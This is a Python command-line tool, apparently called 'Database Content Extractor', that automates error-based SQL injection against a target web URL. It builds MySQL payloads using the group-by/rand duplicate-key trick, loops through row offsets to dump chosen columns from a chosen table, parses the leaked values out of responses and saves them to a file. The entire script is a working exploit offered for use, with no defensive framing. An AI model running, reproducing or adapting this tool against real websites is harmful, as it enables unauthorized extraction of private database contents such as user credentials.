#!/usr/bin/python

import sys, urllib3, getopt, re, time

start = time.time()
opts, args = getopt.getopt(sys.argv[1:], "t:T:C:f:p:o:q", ["target=","table=","columns=","format=","prepend=","output=","quiet"])
format = "single"
prepend = ''
outfile = ''
quiet = False
tofile = []
for opt, arg in opts:
    if opt in ("-t", "--target"):
        target = arg
    if opt in ("-T", "--table"):
        table = arg
    if opt in ("-C", "--columns"):
        columns = arg
    if opt in ("-f", "--format"):
        format = 'single' if arg == 'single' else 'double' if arg == 'double' else 'integer' if arg == 'integer' else 'single'
    if opt in ("-p", "--prepend"):
        prepend = arg
    if opt in ("-o", "--output"):
        outfile = arg
    if opt in ("-q", "--quiet"):
        quiet = True

def makePayload(table, columns, offset, format, prepend):
    payload = "'" if format == 'single' else '"' if format == 'double' else '' if format == 'integer' else "'"
    if prepend is not '':
        payload += prepend.replace(' ', '+')
    payload += "+or+1+group+by+concat((select+concat(0x3c647164756d703e,concat_ws(0x3a,%s),0x3c2f647164756d703e)+from+%s+limit+%s,1),0x00,ceil(rand(0)*2))+having+min(0)+--+-" % (columns,table,i)
    return payload

def sendRequest(target, payload):
    http = urllib3.PoolManager()
    return http.request('GET', target + payload)

def parseResponse(response):
    return re.search(b'<dqdump>([^<]+)', response.data)

if __name__ == "__main__":
    print("================================================")
    print("= Database Content Extractor v0.3              =")
    print("= by RogueCoder                                =")
    print("================================================")
    print("")
    print("Target     : %s" % target)
    print("Table      : %s" % table)
    print("Columns    : %s" % columns)
    print("Format     : %s" % format)
    if prepend is not '':
        print("Prepending : %s" % prepend)
    i = 0
    print("Payload    : %s" % makePayload(table, columns, 0, format, prepend))
    print("")
    print("================================================")
    print("")
    x = 1
    while True:
        payload = makePayload(table, columns, i, format, prepend)
        response = sendRequest(target, payload)
        match = parseResponse(response)
        if match:
            output = match.group(1).decode("utf-8")
            if outfile is not '':
                tofile.append(output)
            if quiet is False:
                print(output)
            elif quiet is True:
                print("{0}\r".format("Quiet mode enabled. Extracting rows... %s" % str(i+1)), end="")
        else:
            print("{0}\r".format("Quiet mode enabled. Extracting rows... Done!", end=""))
            break
        i += 1

    if (i > 0):
        if outfile is not '':
             f = open(outfile, 'w')
             f.write("\n".join(tofile))
             f.close()
        print("")
        print("Successfully extracted %s results in %.2f seconds" % (i, (time.time()-start)))
    else:
        print("Unable to grab any data")